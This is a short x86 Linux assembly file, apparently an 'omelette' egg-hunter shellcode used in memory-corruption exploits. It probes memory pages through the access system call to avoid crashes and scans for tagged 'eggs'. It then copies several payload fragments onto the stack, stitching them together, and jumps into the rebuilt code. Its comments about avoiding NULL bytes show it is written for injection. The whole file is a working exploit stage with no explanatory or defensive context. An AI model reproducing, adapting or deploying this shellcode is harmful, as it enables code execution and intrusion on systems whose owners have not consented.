global _start

section .text

_start:
jmp short call_get_target

; Set edi to offset on stack
get_target:
push esp
pop edi
add di,0x3ff ; 0x3ff is offset within stack
push byte 0x2
pop eax

calc_target:
xor esi, esi
mov si, -0xb4 ;(egg_size+10) for each egg

get_target_loop:
dec edi
inc esi
cmp si,-1
jnz get_target_loop
dec eax
jnz calc_target
ret

call_get_target:
call get_target

xor	edx, edx
push	byte 0x3 ;number of eggs +1 to prevent NULL bytes on comparision
pop	ecx
push	edi

nextpage:
or	dx, 0xfff

nextaddr:
inc	edx
lea	ebx, [edx+0x4]
push	byte 0x21
pop	eax
int	0x80
cmp	al, 0xf2
jz	nextpage
mov	eax, 0x77303001
add eax, ecx
mov	edi, edx
scasd
jnz	nextaddr
scasd
jnz	nextaddr
pop	edi

copy_egg:
mov	esi, edx
add	esi, 0x8
push	ecx
push	byte 0x60
pop	ecx
rep	movsb
pop	ecx
dec	ecx
cmp	cl,1
push	edi
jnz	nextaddr

pop	esi
call	get_target
jmp	edi
